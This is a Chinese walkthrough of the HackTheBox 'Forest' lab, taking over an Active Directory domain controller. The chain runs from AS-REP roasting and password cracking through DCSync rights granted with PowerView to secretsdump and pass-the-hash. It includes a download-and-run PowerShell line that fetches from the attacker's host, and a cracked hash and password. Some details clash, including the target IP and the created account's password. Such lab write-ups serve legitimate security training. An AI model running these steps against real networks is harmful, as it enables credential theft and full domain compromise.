> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vuLzOygGpndeHQzUMOKtxw)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44ibKToMPMlbr8Lia9f0lPUmpNSRib3cNPA5o1LzT7BAfY1IHkqRfMyiaOmg/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
https://app.hackthebox.com/machines/Forest
```

靶场: HackTheBox.com

靶机名称: Forest

难度: 简单

提示信息:

```
无
```

目标: user.txt 和 root.txt

实验环境
----

```
攻击机:Manjaro 10.10.16.3

靶机:10.10.10.239
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -p- -T4 -sS 10.10.10.161
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44DRl8Llxe0WhiaYRdoUCo7BhX47BYpoTkfic7s21ql44ZocLDt5UdEVhg/640?wx_fmt=png)

扫描到多个端口，挑一些重要端口做个详细扫描

```
sudo nmap -sC -sV -p 53,88,139,445,593,3268 10.10.10.161 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44VwtTEy0tpZfVDzQRBdVD7kRw7h2FtVj5LaFAUWKhzcMCMYCSDCuNQg/640?wx_fmt=png)

从端口扫描的信息中搜集到一些信息，可以看出是这是一台域控主机，445 端口上发现系统版本为 Windows Server2016 的 14393 版本，还有域名 htb.local 和主机名 FOREST。继续深入探测信息

### DNS 信息收集

```
dig @10.10.10.161 htb.local
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44AiciaJ03kuxr6jEzJOSoNWHkh4F5baOrYrwDxQWN0Et2uGtpsRD50v8Q/640?wx_fmt=png)

```
dig @10.10.10.161 FOREST.htb.local
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44ZebRhLJGl9Io6M4Pussr37NG7htT5PHsbPTEljIWknh4uPhU0mO8CQ/640?wx_fmt=png)

```
dig axfr @10.10.10.161 htb.local
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44g6ic86HAg9YLib0yStPb6NWvwHReeGt1OPjIMbkrY5hWyTTaZiaHLtIDA/640?wx_fmt=png)

没有发现可利用的信息，再来看看 445 端口

### SMB 服务信息收集

```
smbmap -H 10.10.10.161
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44sIAesf1jtVfGGjB3SqOEJnkwBeFkpYu34X6xWyhSASJaHicdibkeUANw/640?wx_fmt=png)

```
smbclient -N -L 10.10.10.161
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44gTcFDhWCpm1msk2kib6O1zicSS3nRzauSLZ7nnlPpHiaZs6PS5mfIpiaww/640?wx_fmt=png)

未发现共享目录，再来枚举用户

```
rpcclient -U "" -N 10.10.10.161
enumdomusers
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44465uy92t4LT0UAcXPb7rTYLEN88SGSVOOdhHbrJczxxyPXbggFBPug/640?wx_fmt=png)

发现大量用户账号，尝试使用 GetNPUsers.py 验证哪些用户不需要密码即可拿到 TGT 票据

### 域渗透

先将账号名提取出来（这里我使用 NotePad++ 直接替换加正则 “](.)+” 来匹配“]" 后面的全部内容）

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44GDLhgSI3NWdXrPtns8Y0iaLl8ca25OPj1wibWfYLZ1omeL2ZQyIUNQNA/640?wx_fmt=png)

整理出来用户名后直接使用 GetNPUsers.py 脚本获取 TGT 票据

```
GetNPUsers.py htb.local/ -usersfile username.txt -dc-ip 10.10.10.161
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44fI5MIic8bIte33x8OcM1AqSGThic0icJXrsiacReJwWkFWwRdm6tCjywjw/640?wx_fmt=png)

拿到 svc-alfresco 用户的票据，将票据保存下来尝试暴破密码

```
echo '$krb5asrep$23$svc-alfresco@HTB:ea501fdbf981a4fde7c609b94c83be67$79a4cad466c100a2b4cf8fb18ca617da493d2061b03acf19858b058189e2f980cdd0a336a2268ae39c83aee7c33dc37c28621851316af2210b5fe42b3af307f0af35bbd4b658c9cf13ee651a4d19e5933f699774e98b35bde7d8a9dd4398d9307074fb8db9dad719b4001417ee3893b5924d6d87f34d703af28b84d60f91558ec36492a18b80249e45ed3b0984fc67a9ff1ef370af51b5de824f12c6382cbd3468c4f7fe1d7c05a6892dd590d32ce20dd1d4565572380897d0f7be97373e11e7c1ab39e1e5407d380fa2f6f17f89509cc2df6a4f1dc02838eef89b1422d86171' >svc-alfresco-hash.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44Wc2kicTn8OnicnfltRuo4KJS8ESAnibibuPn0mbt66LR3sn26nog2VAlibg/640?wx_fmt=png)

开始暴破

```
john svc-alfresco-hash.txt -w=../../Dict/rockyou.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44yia52HlVhK1wiaowiatfYccgTd0q6GXeSicOadRn3bz0OTVCDHwiarHEg6A/640?wx_fmt=png)

拿到密码，尝试登录 WinRM

```
svc-alfresco -p s3rvice
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44lCicf4fUIgMXaDYEOcyDIPeVaZzMq0NfiaFSa4V0uKcibozfZDNYmx7LQ/640?wx_fmt=png)

登录成功

```
cd ../Desktop
type user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE445m8uyXiaiaXSiaHuRicYIENXHzXFSiaqTj73QA6gfumgMcCAqfVsvP7IIbg/640?wx_fmt=png)

在 svc-alfresco 用户的桌面上找到 flag，继续搜集

### BloodHOund 收集信息

BloodHound 是一个公共且免费的工具，它使用图形理论来自动化的在 Active Directory 环境中搞清楚大部分人员的关系和细节。你的团队可以使用 BloodHound 快速深入了解 AD 的一些用户关系，了解哪些用户具有管理员权限，哪些用户有权对任何计算机都拥有管理权限，以及有效的用户组成员信息。

##### 下载地址：

```
https://github.com/BloodHoundAD/BloodHound/releases/tag/4.2.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44mCPMybwwX9OticyHmHLmYk3MT9MNBlKum28XKfvWXcH5sVPx2mssyXw/640?wx_fmt=png)

启动 Neo4j 服务

```
sudo neo4j start
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44Rd2eYe5W4lurVjKHOqKe6PKibqXEuasV7DPY0pN7TMCkCXZfN8LunUg/640?wx_fmt=png)

启动后访问本地 7474 端口

```
http://localhost:7474
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44nx76VfFawvqM5XNHyN2OlEWF04gibSpnW4kABAjIRBdvZibgW0GicTxsw/640?wx_fmt=png)

填写默认账号密码 neo4j 登录

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44C0SxmWAePDNZ3tA1ojs9fibak5nF2ZGAoQ6KQbmBicYZPuJ3cgOJs68g/640?wx_fmt=png)

首次登录会提示修改密码，修改后在终端上输入 bloodhound

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44eo3gmLVyA94LB3WZkSJNibcItkupyjBHsfhWIux9j9p9ibDGKeYIxHTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44lQLoY3CB9aBwnMNwcQo4wsFrJ9WuLXaYfhgO0Kia4cCTH8IxhJVxgIw/640?wx_fmt=png)

在弹出窗口中输入默认账号 neo4j 和刚修改过的密码即可登录，现在还需要向靶机收集信息可以使用 bloodhound 提供的 sharphound，

```
python3 -m pip install bloodhound
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44IFibIhI524Ciak8iakgMmJmPzKOH8Pb8sLdZYlMArpKrJBYsGlglkDIiag/640?wx_fmt=png)

```
~/.local/bin/bloodhound-python -usvc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c ALL
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44GDqvEC87qVoueickFKHBPPRictibraIZKwXSjDDuk2OOZRzkLwDic5OAGw/640?wx_fmt=png)

收集后会在当前目录下生成几个 json 文件，将 json 导入到 bloodhound 中（直接拖进去）

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44NgKAZOWuJmw6WoE6hWT3hj84juIUZLAsopWZ4MJJAQ8QtR53Jy69Tg/640?wx_fmt=png)

提示上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44haVeYnezOcJiawkbmSxeCuQhZFanVxvZAqrdgbxxMXjdIzhECCrs2Zg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44uf9YIic8jwhtkmr8icWmT5gNw3NwHrsJib18wIJWN4erNPext0ASibAvlA/640?wx_fmt=png)

从上图可以看出

svc-alfresco 用户在 SERVICE ACCOUNTS 组中

SERVICE ACCOUNTS 是 PRIVILEGED IT ACCOUNTS 组的成员

PRIVILEGED IT ACCOUNTS 又属于 ACCOUNT OPERATORS 组

而 Account Operators 组对 Exchange Windows Permissions 组拥有 Generic All （所有权限）

Exchange Windows Permissions 组中用户可以对域进行 DCSync（DRS(Directory Replication Service) 协议通过 IDL_DRSGetNCChanges 从域控制器复制用户凭据）

所以当前用户 svc-alfresco 拥有 Exchange Windows Permissions 组权限，再通过 DCSync 拿到域用户密码 hash 值

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44CHOkTesAW7cUtveSraBa1RRiahCWGvDdmQKNO05vAiadLlmWm2jdibU5g/640?wx_fmt=png)

右键点击 WriteDacl 在弹出菜单中点击 Help，弹出窗口提示可以为自己授予 DCSync 权限，并列出操作步骤。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44zP99rwvvvQp0ToO8LEUao4asia09czsFr3q97x6fzyPW4XPW7sibw7rw/640?wx_fmt=png)

按照提示来操作

1。创建账号并添加到 Exchange Windows Permissions 组

```
net user kkk kkk123! /add /domain
net group "Exchange Windows Permissions" kkk /add /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE440BVEY2Z8PGtW4rPzBickORmpPYTU1abTPjXHORUxz1klEibrLfIV0R1w/640?wx_fmt=png)

2。上传 PowerView.ps1 脚本授予 DCSync 权限

脚本下载地址

```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

将 PowerSploit 克隆到攻击机上，并在 PowerView.ps1 目录下开启 HTTP 服务

```
python3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44rMZZpWQMzyc7QmQNUCoQJuGrE7g7hQDJPWiaYNZwPWchjKHpYicbqC0g/640?wx_fmt=png)

靶机下载 PowerView.ps1 脚本，并执行攻击（截图中顺序有错误是因为网络卡顿重新登录 winrm 后没有重再次加载 PowerView.ps1）

```
iex(New-Object Net.webclient).downloadstring('http://10.10.16.3:8000/powerview.ps1')
$Password = ConvertTo-SecureString 'kkk@123!' -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ('HTB\kkk', $Password)
Add-DomainObjectAcl -Credential $Credential -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity kkk -Rights DCSync
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44cHz7VTic6aL6hPaxxM6ZEiaOtIKOPSax2qEhibancmiaCUKzUb3K13ow6g/640?wx_fmt=png)

添加完权限后，在攻击机上使用 Impacket 中的 secretsdump.py 脚本导出 hash 密码

```
secretsdump.py 'htb.local/kkk:kkk123!@10.10.10.161'
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44c4lgaVTTLDNpkPZHziaSyWzFNdx3aNdDhWACvPAoMmTu64CY9JGDvpg/640?wx_fmt=png)

拿到 administrator 的 hash 值，使用 Impacket 中的 wmiexec.py 脚本登录靶机

```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44gSicujDc1zBiaiaCmR89LLYNEtFKo6tRyXLJWfNYKsEtmf29RKRnqry1Q/640?wx_fmt=png)

登录成功，找一下 flag

```
cd c:\users\administrator
tree /f
type Desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE44nEAZsicxRpibt1WhsBQ9GWkc6XAZ3xBibnReHswt44SqfQG3PLiaN59cQQ/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtE02WppYnrIxKte7C6ZE440YX8S1tib3HHIu66zfHibGhlcazmHIbsia9oV8OWmrOSia4Wc1aI6U27NQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghASaTvKqrr5oviaDdRNIB3brRen4Pk1YST6D74jlejaMedJeG5Led8k5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUtcr33Ov5tbqz0BvQHnPnI0nAodhBWJazcG4gzDkic1CnOcujlia3G0IyCn3YCnsq0c78JYJcZGeJyg/640?wx_fmt=jpeg)